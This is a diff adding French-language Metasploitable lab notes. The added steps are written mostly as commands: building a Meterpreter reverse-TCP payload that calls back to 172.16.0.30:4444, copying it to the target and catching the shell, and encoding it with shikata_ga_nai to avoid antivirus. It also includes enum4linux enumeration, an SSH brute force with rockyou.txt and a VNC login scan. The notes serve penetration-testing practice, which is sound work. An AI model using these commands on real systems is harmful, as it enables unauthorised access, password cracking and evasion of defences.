@@ -112,5 +112,61 @@ msfvenom -h
 
 # Création d'un payload
 ```
-msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=172.16.0.30
+msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=172.16.0.30 LPORT=4444 > runmeplz
 ```
+
+# Envoie du payload sur la machine distante Metasploitable
+```
+scp -o HostKeyAlorithms=+ssh-rsa runmeplz [username]@172.16.0.102:/home/[username]
+```
+
+# Génération du payload
+```
+use exploit/multi/handler 
+set payload linux/x86/meterpreter/reverse_tcp
+set LPORT 4444
+set LHOST 172.16.0.30
+show info
+exploit -j -z
+```
+
+# Sur la machine Metasploitable
+```
+./runmeplz
+```
+
+# Encodage avec Shikata afin d'être moins détectable par un antivirus
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf x86/shikata_ga_nai LHOST=172.16.0.30 LPORT=4444 > runmeplz
+```
+
+# Exploit 5 : Scanner (enum4linux) et bruteforce
+```
+enum4linux -U 172.16.0.102
+```
+
+# Tentative de déterminer le mot de passe du compte klog
+```
+use auxiliary/scanner/ssh/ssh_login
+set RHOST 172.16.0.102
+set USERNAME klog
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set THREADS 4
+set STOP_ON_SUCCESS true
+run
+```
+
+# Exploit 6 VNC (port 5900)
+```
+use auxiliary/scanner/vnc/vnc_login
+set RHOSTS 172.16.0.102
+set username root
+run
+```
+
+# Login successful
+```
+vcnviewer 172.16.0.102
+```
+
+# End
